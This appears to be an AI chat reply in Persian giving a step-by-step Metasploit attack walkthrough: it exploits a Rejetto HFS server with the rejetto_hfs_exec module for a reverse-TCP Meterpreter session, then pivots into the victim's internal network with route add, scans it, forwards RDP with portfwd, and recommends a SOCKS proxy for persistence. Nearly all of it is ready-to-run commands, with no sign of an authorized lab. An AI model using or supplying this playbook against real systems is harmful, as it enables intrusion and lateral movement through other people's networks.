

باشه، پس سناریو رو با هم می‌چینیم:  
تو با اکسپلویت **`exploit/windows/http/rejetto_hfs_exec`** تونستی یک **Meterpreter session** بگیری و حالا می‌خوای از همون سیستم برای **Pivoting** و **Port Forwarding** استفاده کنی تا به بقیه شبکه داخلی قربانی دسترسی پیدا کنی.

---

## 1️⃣ پیش‌نیازها

- یک Session فعال (Meterpreter) روی سیستم هدف که داخل یک شبکه داخلی قرار دارد.
    
- دسترسی لازم به آن Session (معمولاً با `sessions -i <id>`).
    
- فعال بودن شبکه داخلی هدف (باید بررسی کنیم با دستوراتی مثل `ipconfig` یا `arp`).
    

---

## 2️⃣ Pivoting در متاسپلویت (Route)

**Pivoting** یعنی استفاده از یک سیستم به عنوان پل برای رسیدن به سیستم‌های دیگر داخل شبکه هدف.

### مراحل:

1. لیست کردن Sessionها:
    

```bash
sessions
```

2. رفتن به Session:
    

```bash
sessions -i 1
```

3. دیدن شبکه‌های داخلی:
    

```bash
ipconfig
```

فرض کن قربانی یک شبکه داخلی `192.168.10.0/24` دارد.

4. خروج از Session و افزودن Route:
    

```bash
background
route add 192.168.10.0 255.255.255.0 1
```

اینجا:

- `192.168.10.0` → شبکه داخلی
    
- `255.255.255.0` → ماسک
    
- `1` → شماره Session
    

5. حالا هر ماژولی در Metasploit که اجرا می‌کنی می‌تواند روی این شبکه داخلی کار کند.
    

مثلاً اسکن پورت‌ها:

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.10.0/24
run
```

---

## 3️⃣ Port Forwarding در متاسپلویت

**Port Forwarding** یعنی انتقال یک پورت از سیستم قربانی به سیستم خودت.

### مراحل:

1. داخل Session Meterpreter:
    

```bash
portfwd add -l 3389 -p 3389 -r 192.168.10.5
```

اینجا:

- `-l 3389` → پورتی که روی سیستم خودت گوش می‌کند.
    
- `-p 3389` → پورتی که روی سیستم مقصد باز است.
    
- `-r 192.168.10.5` → آی‌پی مقصد داخل شبکه قربانی.
    

2. حالا اگر RDP رو فعال داشته باشی، می‌توانی روی سیستم خودت وصل شوی:
    

```bash
xfreerdp /u:administrator /p:password /v:127.0.0.1
```

یا روی ویندوز:

```
mstsc /v:127.0.0.1
```

---

## 4️⃣ ترکیب سناریو با `exploit/windows/http/rejetto_hfs_exec`

1. اجرای اکسپلویت:
    

```bash
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <target_ip>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
run
```

2. گرفتن Session.
    
3. شناسایی شبکه داخلی (`ipconfig` و `arp`).
    
4. استفاده از `route add` برای Pivoting.
    
5. استفاده از `portfwd` برای دسترسی مستقیم به سرویس‌های داخلی.
    

---

## 5️⃣ نکته امنیتی

- Pivoting خیلی راحت شناسایی میشه اگر IDS/IPS روی شبکه داخلی باشه.
    
- Port forwarding در متاسپلویت فقط در زمان داشتن Session فعال کار می‌کند.
    
- برای ماندگاری بهتر میشه از SOCKS Proxy (`auxiliary/server/socks_proxy`) استفاده کرد تا ابزارهای خارج از متاسپلویت هم به شبکه داخلی وصل بشن.
    

---
